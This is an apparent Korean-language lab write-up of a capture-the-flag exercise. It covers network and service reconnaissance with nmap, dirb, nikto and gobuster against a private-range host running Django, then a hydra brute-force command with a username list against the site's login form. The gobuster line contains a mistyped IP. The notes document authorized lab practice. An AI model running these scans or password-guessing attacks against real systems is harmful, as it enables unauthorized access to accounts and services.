# \[정보수집]
## 1. IP 검색
`nmap 192.168.56.0/24`
![[Pasted image 20240930150614.png]]
- 22/tcp: ssh 서비스 활성화
- 8080/tcp: http 서비스 활성화

## 2. 서비스 탐색
`nmap 192.168.56.112 -sV -v -p-`
![[Pasted image 20240930151517.png]]
`dirb http://192.168.56.112:8080/`
- django 관리자 로그인 페이지: `http://192.168.56.112:8080/admin`
- 일반 사용자 로그인 페이지: `http://192.168.56.112:8080/`
`nikto -h http://192.168.56.112:8080/`
`gobuster dir -u http://192.169.56.112:8080/ -w /usr/share/dirb/wordlists/common.txt/admin`

# \[브루트 포스 공격]
- `weakuser.txt` 파일 생성
- guest, venus, magellan 추가 저장
`hydra 192.168.56.112:8080 http-form-post "/:username=^USER^&pwd=^PASS^:Invalid username." -L weakuser.txt -P weakpass.txt`